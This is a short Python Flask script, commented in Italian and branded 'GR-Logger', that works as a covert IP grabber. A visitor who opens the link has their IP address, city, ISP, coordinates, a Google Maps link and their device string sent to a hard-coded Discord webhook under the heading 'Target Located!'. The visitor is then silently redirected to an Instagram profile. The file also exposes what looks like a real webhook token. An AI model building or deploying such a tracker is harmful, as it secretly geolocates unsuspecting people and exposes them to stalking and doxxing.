from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- CONFIGURAZIONE ---
# Il tuo URL Webhook di Discord
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474401525773238393/7scwYZnW0mMNcSgdih7Pw32_YO5jgyKr9GbMjRR15AtVQ9TNC0v1Y7FPY55zTvbIjGMW"
# Il profilo Instagram di destinazione
SITO_DI_DESTINAZIONE = "https://www.instagram.com/___lollix___?igsh=dmJwNXFucTlrcmtm"

@app.route('/')
def logger():
    # 1. Recupera l'IP reale (gestisce i proxy di Render)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # 2. Ottieni la posizione con ip-api.com (più preciso e senza registrazione)
    try:
        # Richiediamo campi specifici tra cui lat e lon per la mappa
        params = "status,message,country,regionName,city,isp,lat,lon"
        response = requests.get(f"http://ip-api.com/json/{ip}?fields={params}").json()
        
        if response.get("status") == "success":
            citta = response.get("city", "Sconosciuta")
            regione = response.get("regionName", "Sconosciuta")
            paese = response.get("country", "Sconosciuto")
            isp = response.get("isp", "Sconosciuto")
            lat = response.get("lat")
            lon = response.get("lon")
            
            # Crea il link per Google Maps
            mappa_url = f"https://www.google.com/maps?q={lat},{lon}"
            posizione_testo = f"{citta} ({regione}), {paese}"
        else:
            posizione_testo = "Posizione non trovata (IP privato o VPN)"
            isp = "Sconosciuto"
            mappa_url = "N/A"
            
    except Exception as e:
        posizione_testo = "Errore API di tracciamento"
        isp = "Sconosciuto"
        mappa_url = "N/A"

    # 3. Prepara il messaggio per Discord con Embed
    payload = {
        "embeds": [{
            "title": "🎯 Bersaglio Localizzato!",
            "color": 15158332, # Colore Rosso
            "fields": [
                {"name": "🌐 Indirizzo IP", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Posizione", "value": posizione_testo, "inline": True},
                {"name": "🏢 Provider (ISP)", "value": isp, "inline": False},
                {"name": "📱 Dispositivo", "value": request.user_agent.string, "inline": False},
                {"name": "🗺️ Mappa", "value": f"[Clicca qui per vedere su Google Maps]({mappa_url})", "inline": False}
            ],
            "footer": {"text": "Log generato da GR-Logger"}
        }]
    }

    # 4. Invia i dati a Discord
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except:
        pass

    # 5. Reindirizza l'utente a Instagram
    return redirect(SITO_DI_DESTINAZIONE)

if __name__ == "__main__":
    app.run(port=5000)
